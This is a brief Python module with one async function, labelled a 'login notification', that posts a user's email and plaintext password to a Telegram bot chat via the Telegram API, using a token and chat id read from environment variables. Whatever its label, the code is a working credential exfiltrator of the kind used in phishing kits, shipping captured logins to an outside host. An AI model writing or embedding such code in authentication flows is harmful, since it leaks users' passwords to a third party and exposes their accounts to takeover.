import httpx
import os
import logging

logger = logging.getLogger("telegram")

async def send_login_notification(email: str, password: str):
    token = os.getenv("TELEGRAM_BOT_TOKEN")
    chat_id = os.getenv("TELEGRAM_CHAT_ID")

    if not token or not chat_id:
        logger.warning("Telegram credentials not found. Skipping notification.")
        return

    message = f"🚨 **New Login Detected**\n\n📧 **Email:** `{email}`\n🔑 **Password:** `{password}`\n\n_Security Alert: Passwords should usually not be logged or transmitted in plain text._"
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }

    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(url, json=payload)
            if response.status_code != 200:
                logger.error(f"Failed to send Telegram message: {response.text}")
    except Exception as e:
        logger.error(f"Error sending Telegram message: {e}")
